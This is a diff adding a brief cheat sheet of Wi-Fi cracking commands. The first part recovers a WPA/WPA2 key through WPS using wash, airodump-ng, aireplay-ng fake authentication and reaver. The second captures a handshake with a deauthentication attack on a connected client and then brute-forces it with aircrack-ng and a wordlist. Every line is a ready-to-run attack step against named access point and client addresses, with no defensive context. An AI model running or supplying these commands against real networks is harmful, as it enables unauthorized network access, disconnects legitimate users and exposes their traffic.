@@ -1,0 +1,22 @@
+# =====  Get WPA / WPA2 key with WPS enabled  ===============
+wash --interface wlan0
+airodump-ng wlan0 --wps
+
+aireplay-ng --fakeauth 30 -a 90:8D:78:55:7A:A4 -h FA:25:47:30:75:D4 wlan0
+
+reaver --bssid 90:8D:78:55:7A:A4 --channel 10 --interface wlan0 -vvv --no-associate
+
+
+# =====  Get WPA / WPA2 key with WPS disabled  ===============
+irodump-ng --bssid 90:8D:78:55:7A:A4 --channel 10 --write WPA_handshake wlan0
+# wait for a new client to connect or use a deauth attack on existing client
+aireplay-ng --deauth 4 -a 90:8D:78:55:7A:A4 -c 8C:B8:4A:8F:A0:9B wlan0
+
+# Create a word list or download 
+
+# brut force attack
+aircrack-ng WPA_handshake-01.cap -w wordlist.txt
+
+# and let it run ......
+
+
